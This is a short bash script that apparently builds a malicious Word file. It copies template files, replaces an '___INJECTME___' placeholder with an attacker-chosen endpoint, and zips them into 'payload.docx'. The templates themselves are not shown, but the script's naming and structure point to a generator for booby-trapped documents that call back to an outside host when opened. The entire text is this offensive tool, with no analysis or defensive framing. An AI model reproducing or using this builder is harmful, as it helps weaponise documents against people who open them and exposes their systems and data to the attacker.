#!/bin/bash

fileType=$1
endPoint=$2
fileName=$RANDOM

tempdir=$(mktemp -d)
echo "[+] Created tmp folder - $tempdir"
echo "[+] Copying files to tmp folder"
cp -r ./$fileType/ $tempdir
echo "[+] Replacing vars"
find $tempdir -type f ! -iname "*$fileType" -exec sed -i "s;___INJECTME___;$endPoint;g" {}  \;
echo "[+] Creating document"
files=$(find $tempdir -type f ! -iname "*$fileType" | sed 's;\n; ;g')
zip -r $tempdir/payload.docx $files
echo "[+] Document created at $tempdir/payload.docx"



